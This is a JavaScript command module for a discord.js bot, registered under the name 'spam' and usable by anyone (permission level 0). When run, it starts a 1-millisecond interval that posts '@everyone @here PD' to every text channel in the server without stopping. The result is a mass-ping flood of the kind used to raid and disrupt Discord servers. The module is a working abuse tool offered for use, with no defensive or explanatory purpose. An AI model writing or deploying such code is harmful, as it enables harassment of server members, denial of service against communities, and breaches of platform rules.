const Discord = require('discord.js');
    
exports.run = (client, message, args) => {

client.setInterval(()=>
    {
   
        
           message.guild.channels.findAll("type", "text").map(c => c.send("@everyone @here PD"))
           
        
},1);
        
    
    }
  
    exports.conf = {
        enabled: true,
        guildOnly: false,
        aliases: [],
        permLevel: 0
      };

      exports.help = {
        name: 'spam',
        description: '',
        usage: ''
      };
